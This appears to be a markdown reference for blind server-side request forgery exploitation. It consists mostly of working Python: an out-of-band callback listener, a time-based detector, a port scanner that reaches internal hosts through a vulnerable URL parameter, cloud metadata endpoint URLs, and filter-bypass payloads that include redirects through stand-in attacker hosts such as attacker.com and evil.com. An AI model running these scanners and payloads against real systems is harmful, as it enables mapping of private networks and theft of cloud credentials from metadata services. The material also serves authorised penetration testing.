# API Reference: Blind SSRF Exploitation

## Libraries Used

| Library | Purpose |
|---------|---------|
| `requests` | Send crafted HTTP requests with SSRF payloads |
| `socket` | Low-level port scanning and connection testing |
| `http.server` | Out-of-band callback listener for blind detection |
| `urllib.parse` | Construct and encode SSRF payload URLs |
| `time` | Measure response timing for time-based blind SSRF |

## Installation

```bash
pip install requests
```

## Techniques and Payloads

### Cloud Metadata Endpoints

| Cloud Provider | Metadata URL |
|----------------|-------------|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` |
| AWS IMDSv2 | Requires `X-aws-ec2-metadata-token` header |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` |
| DigitalOcean | `http://169.254.169.254/metadata/v1/` |
| Oracle Cloud | `http://169.254.169.254/opc/v2/instance/` |

### Internal Network Scanning Payloads
```python
# Common internal targets for blind SSRF probing
INTERNAL_TARGETS = [
    "http://127.0.0.1:{port}",
    "http://localhost:{port}",
    "http://0.0.0.0:{port}",
    "http://[::1]:{port}",
    "http://10.0.0.1:{port}",
    "http://192.168.1.1:{port}",
    "http://172.16.0.1:{port}",
]

COMMON_PORTS = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017]
```

## Core Functions

### Out-of-Band (OOB) Blind SSRF Detection
```python
import requests
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

class CallbackHandler(BaseHTTPRequestHandler):
    received = []

    def do_GET(self):
        CallbackHandler.received.append({
            "path": self.path,
            "headers": dict(self.headers),
            "client": self.client_address[0],
        })
        self.send_response(200)
        self.end_headers()

    def log_message(self, format, *args):
        pass  # Suppress console output

def start_callback_server(port=8888):
    server = HTTPServer(("0.0.0.0", port), CallbackHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server

def test_blind_ssrf_oob(target_url, param_name, callback_url):
    """Test for blind SSRF using OOB callback."""
    payload = callback_url + "/ssrf-test"
    resp = requests.get(
        target_url,
        params={param_name: payload},
        timeout=10,
    )
    return resp.status_code
```

### Time-Based Blind SSRF Detection
```python
import time

def test_time_based_ssrf(target_url, param_name, open_port_url, closed_port_url):
    """Detect SSRF via response time difference between open and closed ports."""
    # Baseline: request to a closed port (should timeout slower)
    start = time.time()
    try:
        requests.get(target_url, params={param_name: closed_port_url}, timeout=15)
    except requests.Timeout:
        pass
    closed_time = time.time() - start

    # Test: request to an open port (should respond faster)
    start = time.time()
    try:
        requests.get(target_url, params={param_name: open_port_url}, timeout=15)
    except requests.Timeout:
        pass
    open_time = time.time() - start

    # Significant time difference indicates SSRF
    return {
        "open_port_time": round(open_time, 2),
        "closed_port_time": round(closed_time, 2),
        "likely_ssrf": abs(closed_time - open_time) > 2.0,
    }
```

### Internal Port Scanner via SSRF
```python
def ssrf_port_scan(target_url, param_name, internal_host, ports):
    """Scan internal ports through a blind SSRF vulnerability."""
    results = {"open": [], "closed": [], "filtered": []}
    for port in ports:
        ssrf_url = f"http://{internal_host}:{port}/"
        start = time.time()
        try:
            resp = requests.get(
                target_url,
                params={param_name: ssrf_url},
                timeout=10,
            )
            elapsed = time.time() - start
            if resp.status_code == 200 and elapsed < 3:
                results["open"].append(port)
            else:
                results["closed"].append(port)
        except requests.Timeout:
            results["filtered"].append(port)
    return results
```

### URL Bypass Techniques
```python
BYPASS_PAYLOADS = [
    # Decimal IP encoding
    "http://2130706433/",           # 127.0.0.1
    # Hex encoding
    "http://0x7f000001/",           # 127.0.0.1
    # Octal encoding
    "http://0177.0.0.1/",
    # IPv6
    "http://[::ffff:127.0.0.1]/",
    # URL encoding
    "http://127.0.0.1%2523@evil.com/",
    # DNS rebinding
    "http://spoofed.burpcollaborator.net/",
    # Redirect-based
    "https://attacker.com/redirect?url=http://169.254.169.254/",
]
```

## Output Format

```json
{
  "target": "https://app.example.com/fetch",
  "parameter": "url",
  "ssrf_confirmed": true,
  "detection_method": "out-of-band",
  "internal_services_found": [
    {"host": "127.0.0.1", "port": 6379, "service": "Redis"},
    {"host": "10.0.0.5", "port": 3306, "service": "MySQL"}
  ],
  "cloud_metadata_accessible": true,
  "bypasses_needed": ["decimal IP encoding"]
}
```
